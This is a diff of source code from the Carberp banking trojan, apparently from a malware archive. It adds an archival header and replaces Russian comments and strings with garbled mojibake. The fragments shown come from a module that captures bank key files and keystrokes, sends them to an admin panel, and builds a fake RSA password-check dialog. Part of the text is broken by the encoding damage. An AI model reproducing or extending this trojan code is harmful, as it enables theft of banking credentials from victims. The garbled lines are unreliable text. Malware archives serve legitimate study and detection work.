@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "GetApi.h"
 #include "Strings.h"
 #include "Memory.h"
@@ -13,7 +24,7 @@ namespace DBGFAKTURAWEB
 
 #define DBGFAKTURA DBGFAKTURAWEB::DBGOutMessage<>
 
-#define FakturaWebModule //говорим что модуль включен
+#define FakturaWebModule //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 #define PROCESS_HASH_OSL2SKS 0xD9BCA8C3
 
@@ -21,7 +32,7 @@ namespace FakturaWeb
 {
 	PKeyLogSystem System = 0;
 
-	//true - если файл является файлом ключем, а также отсылает его в админку
+	//true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int IsFileKey( FileGrabber::ParamEvent* e )
 	{
 		if( e->data )
@@ -65,10 +76,10 @@ namespace FakturaWeb
 		if( S != NULL )
 		{
 			char FacturaCaption[] = {
-				'П', 'р', 'о', 'в', 'е', 'р', 'к', 'а', ' ', 'п', 'а', 'р', 'о', 'л',
-				'я', ' ', '(', 'к', 'л', 'ю', 'ч', ' ', 'R', 'S', 'A', ')', 0 };
+				'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', ' ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ',
+				'пїЅ', ' ', '(', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', ' ', 'R', 'S', 'A', ')', 0 };
 
-//			char FacturaCaption[] = {'П','р','о','в','е','р','к','а',' ','п','р','а','в',' ','п','о','л','ь','з','о','в','а','т','е','л','я',' ','(','п','р','о','в','а','й','д','е','р',' ','R','S','A',')', 0};
+//			char FacturaCaption[] = {'пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ',' ','пїЅ','пїЅ','пїЅ','пїЅ',' ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ',' ','(','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ',' ','R','S','A',')', 0};
 
 
 			S->SendLogAsCAB = true;
